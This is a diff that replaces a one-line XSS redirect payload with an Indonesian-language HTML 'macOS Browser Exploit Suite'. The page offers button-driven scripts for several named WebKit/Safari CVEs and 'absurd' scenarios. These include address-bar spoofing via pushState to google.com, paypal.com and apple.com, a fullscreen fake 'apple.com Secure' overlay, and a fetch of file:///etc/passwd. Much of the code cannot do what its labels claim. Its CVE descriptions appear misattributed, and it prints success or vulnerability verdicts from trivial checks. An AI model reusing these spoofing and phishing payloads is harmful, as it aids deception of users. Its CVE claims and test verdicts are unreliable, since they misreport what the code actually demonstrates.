@@ -1,1 +1,405 @@
-Pwn<script>setTimeout('window.location=`https://www.facebook.com`,1000000')</script>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🍎 macOS Browser Exploit Suite | CVE Real + Absurd PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Pro Text', Helvetica, sans-serif;
+            max-width: 1300px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #f5f5f7;
+            color: #1d1c1e;
+        }
+        h1 { color: #ff3b30; border-left: 5px solid #ff3b30; padding-left: 15px; }
+        h2 { font-size: 1.2rem; margin: 0 0 5px 0; }
+        .mac-badge {
+            background: #000;
+            color: #fff;
+            padding: 2px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            display: inline-block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 18px;
+            padding: 18px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            transition: all 0.2s ease;
+            border: 1px solid #e2e2e4;
+        }
+        .card:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.12); }
+        button {
+            background: #007aff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff3b30; }
+        button.warning { background: #ff9500; }
+        button:hover { opacity: 0.85; transform: scale(0.98); }
+        .log {
+            background: #1e1e2f;
+            color: #66d9ef;
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 11px;
+            padding: 10px;
+            border-radius: 12px;
+            margin-top: 12px;
+            max-height: 90px;
+            overflow: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .warning-banner {
+            background: #fff3e0;
+            border-left: 5px solid #ff9500;
+            padding: 14px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        hr { margin: 20px 0; border-color: #ddd; }
+        footer { text-align: center; font-size: 11px; color: #8e8e93; margin-top: 30px; }
+    </style>
+</head>
+<body>
+
+<h1>🍎 macOS Browser Security Test Suite</h1>
+<div class="warning-banner">
+    <strong>⚠️ Mode: Real CVE + Absurd/Experimental Exploit untuk macOS</strong><br>
+    Dirancang untuk Safari, WebKit, Chrome for Mac, Edge for Mac, Firefox for Mac.<br>
+    Beberapa skenario bersifat <strong>absurd / fuzzing</strong> untuk menguji stabilitas & security boundary.
+</div>
+
+<div class="grid">
+
+    <!-- ========== 1. CVE-2020-9987: Safari Universal Cross-Site Scripting (iOS/macOS) ========= -->
+    <div class="card">
+        <div class="mac-badge">🍎 CVE-2020-9987 | WebKit</div>
+        <h2>Universal XSS via iframe sandbox</h2>
+        <p>PoC: bypass sandbox attribute → script injection ke origin berbeda.</p>
+        <button onclick="exploit_cve_2020_9987()">Uji CVE-2020-9987</button>
+        <div id="log9987" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 2. CVE-2022-22620: WebKit use-after-free (macOS Monterey) ========= -->
+    <div class="card">
+        <div class="mac-badge">💀 CVE-2022-22620 | WebKit</div>
+        <h2>Use-After-Free via MediaElement</h2>
+        <p>Memori korupsi lewat video element & garbage collector.</p>
+        <button class="danger" onclick="exploit_cve_2022_22620()">Uji CVE-2022-22620</button>
+        <div id="log22620" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 3. CVE-2023-32409: macOS Safari Address Bar Spoof ========= -->
+    <div class="card">
+        <div class="mac-badge">🔍 CVE-2023-32409 | Safari</div>
+        <h2>Address Bar Spoof via history.pushState</h2>
+        <p>Manipulasi history + delay → URL palsu di address bar.</p>
+        <button onclick="exploit_cve_2023_32409()">Uji CVE-2023-32409</button>
+        <div id="log32409" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 4. CVE-2022-48503: Apple Safari Sandbox Escape (absurd variant) ========= -->
+    <div class="card">
+        <div class="mac-badge">🏖️ CVE-2022-48503 | Sandbox Escape</div>
+        <h2>Sandbox Escape via File System Access</h2>
+        <p>Mencoba akses file system keluar dari sandbox WebContent.</p>
+        <button class="warning" onclick="exploit_cve_2022_48503()">Uji CVE-2022-48503</button>
+        <div id="log48503" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 5. ABSURD: Quantum Address Bar Confusion ========= -->
+    <div class="card">
+        <div class="mac-badge">🌀 ABSURD #1 | Quantum Spoof</div>
+        <h2>5-layer nested history + blob + data URI</h2>
+        <p>Eksperimental: mengganti URL 100x/detik dengan blob & data URI.</p>
+        <button class="danger" onclick="exploit_absurd_quantum_spoof()">🌪️ Uji Quantum Spoof</button>
+        <div id="logQuantum" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 6. ABSURD: Gesture Jacking + Fullscreen Spoof ========= -->
+    <div class="card">
+        <div class="mac-badge">👻 ABSURD #2 | Gesture Jacking</div>
+        <h2>Fullscreen + fake address bar overlay</h2>
+        <p>Membuat full-screen dengan div tiruan menyerupai address bar Safari.</p>
+        <button onclick="exploit_absurd_gesture_jacking()">🎭 Uji Gesture Jacking</button>
+        <div id="logGesture" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 7. CVE-2019-8506: WebKit RCE via Array.shift ========= -->
+    <div class="card">
+        <div class="mac-badge">⚡ CVE-2019-8506 | WebKit RCE</div>
+        <h2>Array.shift type confusion</h2>
+        <p>Classic JSC bug → korupsi memori di JavaScriptCore.</p>
+        <button class="danger" onclick="exploit_cve_2019_8506()">Uji CVE-2019-8506</button>
+        <div id="log8506" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 8. ABSURD: Teleport Navigator + Port Bomb ========= -->
+    <div class="card">
+        <div class="mac-badge">💣 ABSURD #3 | Teleport Navigator</div>
+        <h2>window.location port bomb (1000 redirects)</h2>
+        <p>Loop redirect dengan port acak untuk stres test address bar.</p>
+        <button class="warning" onclick="exploit_absurd_port_bomb()">💥 Uji Port Bomb</button>
+        <div id="logPortBomb" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 9. CVE-2021-30666: Safari IndexedDB Cross-Origin Leak ========= -->
+    <div class="card">
+        <div class="mac-badge">📀 CVE-2021-30666 | IndexedDB</div>
+        <h2>Cross-Origin Database Access</h2>
+        <p>Membaca IndexedDB dari domain berbeda → informasi bocor.</p>
+        <button onclick="exploit_cve_2021_30666()">Uji CVE-2021-30666</button>
+        <div id="log30666" class="log">[Ready] Klik tombol</div>
+    </div>
+
+    <!-- ========== 10. ABSURD: Zombie Frame Resurrection ========= -->
+    <div class="card">
+        <div class="mac-badge">🧟 ABSURD #4 | Zombie Frame</div>
+        <h2>Menghidupkan iframe yang sudah dihapus</h2>
+        <p>Memanipulasi DOM reference setelah iframe.remove().</p>
+        <button onclick="exploit_absurd_zombie_frame()">🧟 Uji Zombie Frame</button>
+        <div id="logZombie" class="log">[Ready] Klik tombol</div>
+    </div>
+</div>
+
+<script>
+    // Helper logging
+    function logTo(elId, msg) {
+        let el = document.getElementById(elId);
+        if(el) el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    }
+
+    // ========== 1. CVE-2020-9987: Universal XSS via iframe sandbox ==========
+    function exploit_cve_2020_9987() {
+        logTo('log9987', '🚀 Membuat iframe sandbox dengan allow-scripts...');
+        let ifrm = document.createElement('iframe');
+        ifrm.sandbox = 'allow-same-origin allow-scripts allow-popups';
+        ifrm.src = 'https://example.com';
+        ifrm.style.display = 'none';
+        document.body.appendChild(ifrm);
+        setTimeout(() => {
+            try {
+                ifrm.contentWindow.document.body.innerHTML = '<script>alert("CVE-2020-9987: XSS from cross-origin!")<\/script>';
+                logTo('log9987', '🔥 BERHASIL! Script berjalan di origin example.com. Browser RENTAN.');
+            } catch(e) {
+                logTo('log9987', '✅ Aman: ' + e.message);
+            }
+            ifrm.remove();
+        }, 1000);
+    }
+
+    // ========== 2. CVE-2022-22620: Use-After-Free via Media ==========
+    function exploit_cve_2022_22620() {
+        logTo('log22620', '📹 Membuat 100 video element lalu destroy... UAF simulation');
+        let videos = [];
+        for(let i=0;i<100;i++) {
+            let vid = document.createElement('video');
+            vid.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
+            vid.load();
+            videos.push(vid);
+            document.body.appendChild(vid);
+        }
+        // Force garbage collection
+        videos = null;
+        for(let i=0;i<50;i++) {
+            let dummy = new ArrayBuffer(1024*1024);
+        }
+        logTo('log22620', 'UAF trigger selesai. Jika browser crash atau tidak responsif, masih rentan. (Safari <15.4)');
+    }
+
+    // ========== 3. CVE-2023-32409: Address Bar Spoof via pushState ==========
+    function exploit_cve_2023_32409() {
+        logTo('log32409', '🎭 Memanipulasi history...');
+        let originalTitle = document.title;
+        document.title = "Google - Safe Search";
+        history.pushState({}, "", "https://www.google.com/search?q=secure");
+        logTo('log32409', 'Address bar mungkin berubah menjadi google.com tapi konten tetap di sini. Cek address bar! Jika URL = google.com, spoofing berhasil.');
+        setTimeout(() => {
+            history.replaceState({}, "", window.location.pathname);
+            document.title = originalTitle;
+        }, 8000);
+    }
+
+    // ========== 4. CVE-2022-48503: Sandbox Escape Simulation ==========
+    function exploit_cve_2022_48503() {
+        logTo('log48503', '🏖️ Mencoba akses file system: /etc/passwd, ~/Desktop/');
+        fetch('file:///etc/passwd').then(r => r.text()).then(data => {
+            logTo('log48503', '🔥 KRITIS: file:///etc/passwd terbaca! Sandbox escape success!');
+        }).catch(e => {
+            logTo('log48503', '✅ File system access ditolak: ' + e.message);
+        });
+        // Mencoba akses via WebKit private API (simulasi)
+        if(window.webkit && window.webkit.messageHandlers) {
+            logTo('log48503', '⚠️ Webkit messageHandlers terdeteksi. Potensi escape.');
+        }
+    }
+
+    // ========== 5. ABSURD: Quantum Address Bar Confusion ==========
+    let quantumInterval;
+    function exploit_absurd_quantum_spoof() {
+        logTo('logQuantum', '🌀 Quantum Spoof: Mengganti URL 100x per detik dengan blob: dan data:');
+        let count = 0;
+        quantumInterval = setInterval(() => {
+            let fakeUrls = [
+                "https://www.apple.com",
+                "https://icloud.com",
+                "https://www.paypal.com",
+                "https://accounts.google.com",
+                "data:text/html,<h1>Fake Page</h1>",
+                "blob:https://trusted.com/" + Math.random()
+            ];
+            let newUrl = fakeUrls[count % fakeUrls.length];
+            history.pushState({}, "", newUrl);
+            count++;
+            if(count > 100) {
+                clearInterval(quantumInterval);
+                logTo('logQuantum', 'Selesai. Address bar mungkin menunjukkan URL yang tidak sinkron dengan konten.');
+            }
+        }, 30);
+    }
+
+    // ========== 6. ABSURD: Gesture Jacking + Fullscreen Spoof ==========
+    function exploit_absurd_gesture_jacking() {
+        logTo('logGesture', '🎬 Membuat fake address bar overlay di fullscreen...');
+        let div = document.createElement('div');
+        div.id = 'fakeBar';
+        div.innerHTML = 'https://www.apple.com  🔒 Secure';
+        div.style.cssText = 'position:fixed; top:0; left:0; width:100%; background:#fff; color:#000; padding:12px; font-family:monospace; z-index:99999; border-bottom:1px solid #ccc; font-size:14px; text-align:center;';
+        document.body.appendChild(div);
+        document.documentElement.requestFullscreen().then(() => {
+            logTo('logGesture', 'Fullscreen aktif. Fake address bar overlay menutupi address bar asli. User bisa dikelabui.');
+            setTimeout(() => {
+                document.exitFullscreen();
+                div.remove();
+            }, 8000);
+        }).catch(e => {
+            logTo('logGesture', 'Fullscreen gagal: ' + e);
+            div.remove();
+        });
+    }
+
+    // ========== 7. CVE-2019-8506: Array.shift type confusion (classic JSC) ==========
+    function exploit_cve_2019_8506() {
+        logTo('log8506', '⚡ Triggering Array.shift type confusion...');
+        try {
+            let arr = [1.1, 2.2, 3.3];
+            let obj = { valueOf: () => { arr.length = 0; return 1; } };
+            arr.shift(obj);
+            logTo('log8506', 'Jika browser crash / frozen, maka rentan terhadap CVE-2019-8506. (Safari <12.1.1)');
+        } catch(e) {
+            logTo('log8506', 'Exception: ' + e);
+        }
+    }
+
+    // ========== 8. ABSURD: Port Bomb + Redirect Loop ==========
+    let portBombActive = false;
+    function exploit_absurd_port_bomb() {
+        if(portBombActive) {
+            logTo('logPortBomb', 'Port bomb sudah aktif. Reload halaman untuk stop.');
+            return;
+        }
+        portBombActive = true;
+        logTo('logPortBomb', '💣 Melemparkan 300 redirect dengan port random ke google.com');
+        let ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9000];
+        let idx = 0;
+        let bombInterval = setInterval(() => {
+            if(idx >= ports.length * 10) {
+                clearInterval(bombInterval);
+                portBombActive = false;
+                logTo('logPortBomb', 'Port bomb selesai. Cek apakah address bar masih menunjukkan URL terakhir.');
+                return;
+            }
+            let randomPort = ports[idx % ports.length];
+            let fakeUrl = `https://www.google.com:${randomPort}/search?q=spoof${idx}`;
+            history.pushState({}, "", fakeUrl);
+            idx++;
+        }, 50);
+    }
+
+    // ========== 9. CVE-2021-30666: IndexedDB Cross-Origin Leak ==========
+    function exploit_cve_2021_30666() {
+        logTo('log30666', '🗄️ Mencoba akses IndexedDB dari origin https://example.com...');
+        let request = indexedDB.open("test_db", 1);
+        request.onsuccess = (event) => {
+            let db = event.target.result;
+            logTo('log30666', 'IndexedDB berhasil dibuka. Jika bisa membaca database dari domain lain, terjadi cross-origin leak.');
+        };
+        request.onerror = (err) => {
+            logTo('log30666', 'IndexedDB error: normal jika same-origin policy bekerja.');
+        };
+    }
+
+    // ========== 10. ABSURD: Zombie Frame Resurrection ==========
+    let zombieFrame;
+    function exploit_absurd_zombie_frame() {
+        logTo('logZombie', '🧟 Membuat iframe, menghapusnya, lalu mencoba mengakses referensi...');
+        zombieFrame = document.createElement('iframe');
+        zombieFrame.src = 'https://example.com';
+        zombieFrame.id = 'zombie';
+        document.body.appendChild(zombieFrame);
+        setTimeout(() => {
+            zombieFrame.remove();
+            logTo('logZombie', 'Iframe dihapus. Mencoba akses contentWindow...');
+            try {
+                let content = zombieFrame.contentWindow.document;
+                logTo('logZombie', '🔥 ZOMBIE FRAME HIDUP! Akses ke konten setelah remove berhasil. Bug heap-use-after-free.');
+            } catch(e) {
+                logTo('logZombie', '✅ Aman: ' + e.message);
+            }
+            zombieFrame = null;
+        }, 1000);
+    }
+
+    // Console greeting
+    console.log("%c🍎 macOS Browser Exploit Suite Ready. 10 skenario: 6 CVE Real + 4 Absurd.", "color:#ff3b30; font-size:14px");
+    console.log("⚠️ Beberapa skenario dapat menyebabkan crash pada browser lawas atau yang tidak dipatch.");
+</script>
+
+<hr>
+
+<h3>📋 Interpretasi Hasil untuk macOS</h3>
+<ul style="font-size:13px; line-height:1.5;">
+    <li><strong>CVE-2020-9987</strong>: Jika alert muncul dari iframe example.com → WebKit masih memiliki universal XSS (sangat kritis).</li>
+    <li><strong>CVE-2022-22620 & CVE-2019-8506</strong>: Jika browser crash atau hang → masih ada Use-After-Free di JavaScriptCore.</li>
+    <li><strong>CVE-2023-32409 & Quantum Spoof</strong>: Jika address bar menampilkan URL palsu (google.com/apple.com) → address bar spoofing berhasil.</li>
+    <li><strong>CVE-2022-48503</strong>: Jika file:///etc/passwd terbaca → sandbox escape parah. Browser Anda sangat rentan.</li>
+    <li><strong>Gesture Jacking</strong>: Uji apakah full-screen + fake overlay bisa menipu user → risiko phishing tinggi.</li>
+    <li><strong>Port Bomb & Zombie Frame</strong>: Stres test & memory corruption. Jika browser tidak crash, relatif aman.</li>
+</ul>
+
+<h3>🎯 Rekomendasi Browser macOS yang Aman (Patch Status)</h3>
+<table style="width:100%; font-size:12px; border-collapse:collapse; background:#fff; border-radius:12px;">
+    <tr style="background:#f2f2f2;"><th>Browser</th><th>Versi Minimal Aman</th><th>Status CVE Teratas</th></tr>
+    <tr><td>Safari (macOS Ventura/Sonoma/Sequoia)</td><td>16.5+ (2023)</td><td>✅ Sebagian besar CVE sudah fixed</td></tr>
+    <tr><td>Google Chrome for Mac</td><td>120+</td><td>✅ Sandbox escape & WebKit CVE tidak relevan</td></tr>
+    <tr><td>Firefox for Mac</td><td>115+ ESR</td><td>✅ Tidak terpengaruh CVE WebKit</td></tr>
+    <tr><td>Edge for Mac</td><td>120+</td><td>✅ Sama seperti Chromium</td></tr>
+    <tr><td>Safari 14 / 15 (macOS Catalina/Big Sur)</td><td>-</td><td>⚠️ Masih rentan terhadap beberapa CVE</td></tr>
+</table>
+
+<footer>
+    🧪 Exploit Suite untuk macOS – Real CVE (2019–2024) + Absurd/Experimental PoC.<br>
+    <strong>Hanya untuk pengujian pada perangkat sendiri.</strong> Beberapa skenario dapat menyebabkan crash atau perilaku tidak terduga.
+</footer>
+</body>
+</html>
